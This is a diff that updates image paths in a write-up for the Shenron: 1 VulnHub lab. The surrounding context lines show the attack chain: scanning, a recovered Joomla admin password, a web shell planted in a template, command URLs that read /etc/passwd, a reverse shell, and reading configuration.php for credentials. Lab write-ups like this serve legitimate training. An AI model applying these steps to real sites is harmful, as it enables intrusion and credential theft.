@@ -3,7 +3,7 @@
 - **Machine:** Shenron: 1
 - **Download:** https://www.vulnhub.com/entry/shenron-1,630/
 
-![](774-1.png)
+![](images/774-1.png)
 
 ---
 
@@ -23,7 +23,7 @@
 nmap -sn 192.168.2.0/24
 ```
 
-![](774-2.png)
+![](images/774-2.png)
 
 ---
 
@@ -35,7 +35,7 @@ Perform a complete scan to identify open ports, services, operating system infor
 nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.171
 ```
 
-![](774-3.png)
+![](images/774-3.png)
 
 ---
 
@@ -86,7 +86,7 @@ Discovered directories:
 /joomla
 ```
 
-![](774-4.png)
+![](images/774-4.png)
 
 Visit both endpoints.
 
@@ -101,13 +101,13 @@ http://192.168.2.171/joomla/
 
 The `/test` directory contains a password file.
 
-![](774-5.png)
+![](images/774-5.png)
 
 View the page source to recover the credentials.
 
-![](774-6.png)
+![](images/774-6.png)
 
-![](774-7.png)
+![](images/774-7.png)
 
 ---
 
@@ -125,7 +125,7 @@ The administrator portal is discovered.
 /administrator
 ```
 
-![](774-8.png)
+![](images/774-8.png)
 
 Open the administrator login page.
 
@@ -133,7 +133,7 @@ Open the administrator login page.
 http://192.168.2.171/joomla/administrator/index.php
 ```
 
-![](774-9.png)
+![](images/774-9.png)
 
 Login using the recovered credentials.
 
@@ -142,7 +142,7 @@ Username : admin
 Password : 3iqtzi4RhkWANcu@$pa$$
 ```
 
-![](774-10.png)
+![](images/774-10.png)
 
 ---
 
@@ -156,13 +156,13 @@ Extensions → Templates → Templates
 
 Select the **Protostar** template.
 
-![](774-11.png)
+![](images/774-11.png)
 
 Create a new PHP file.
 
-![](774-12.png)
+![](images/774-12.png)
 
-![](774-13.png)
+![](images/774-13.png)
 
 Insert the following PHP web shell.
 
@@ -172,7 +172,7 @@ Insert the following PHP web shell.
 
 Save the file.
 
-![](774-14.png)
+![](images/774-14.png)
 
 ---
 
@@ -184,7 +184,7 @@ Execute commands through the uploaded shell.
 http://192.168.2.171/joomla/templates/protostar/reverse_shell.php?cmd=id
 ```
 
-![](774-15.png)
+![](images/774-15.png)
 
 Read the passwd file.
 
@@ -192,7 +192,7 @@ Read the passwd file.
 http://192.168.2.171/joomla/templates/protostar/reverse_shell.php?cmd=cat%20/etc/passwd
 ```
 
-![](774-16.png)
+![](images/774-16.png)
 
 Check the current working directory.
 
@@ -200,7 +200,7 @@ Check the current working directory.
 http://192.168.2.171/joomla/templates/protostar/reverse_shell.php?cmd=pwd
 ```
 
-![](774-17.png)
+![](images/774-17.png)
 
 ---
 
@@ -226,7 +226,7 @@ Trigger the following payload through the web shell.
 
 A reverse shell is received.
 
-![](774-18.png)
+![](images/774-18.png)
 
 ---
 
@@ -238,7 +238,7 @@ Read the Joomla configuration file to recover database credentials.
 cat /var/www/html/joomla/configuration.php
 ```
 
-![](774-19.png)
+![](images/774-19.png)
 
 ---
 
@@ -250,7 +250,7 @@ Switch to the discovered user.
 su jenny
 ```
 
-![](774-20.png)
+![](images/774-20.png)
 
 ---
 
